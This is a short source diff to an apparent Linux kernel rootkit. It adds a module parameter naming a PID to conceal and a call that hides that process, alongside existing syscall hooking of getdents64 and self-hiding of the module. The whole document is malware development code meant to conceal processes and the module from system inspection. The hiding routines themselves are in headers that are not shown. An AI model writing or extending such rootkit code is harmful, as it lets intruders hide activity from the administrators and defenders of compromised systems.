@@ -5,10 +5,18 @@
 #include <linux/kallsyms.h>
 #include <linux/version.h>
 #include <asm/unistd_64.h>
+#include <linux/proc_fs.h>
 
 #include "hooker.h"
 #include "fake_syscalls.h"
 #include "module_hiding.h"
+#include "process_hiding.h"
+
+struct task_struct *ts;
+int hidden_pid;
+
+module_param(hidden_pid, int, S_IRUSR | S_IRGRP);
+MODULE_PARM_DESC(hidden_pid, "The PID of the process that needs hiding.");
 
 static int __init init_rootkit(void)
 {
@@ -22,6 +30,7 @@ static int __init init_rootkit(void)
     hook_syscall(__NR_getdents64, sys_getdents64_fake);
 
     hide_module(THIS_MODULE);
+    hide_process_pid(hidden_pid);
 
     return 0;
 }
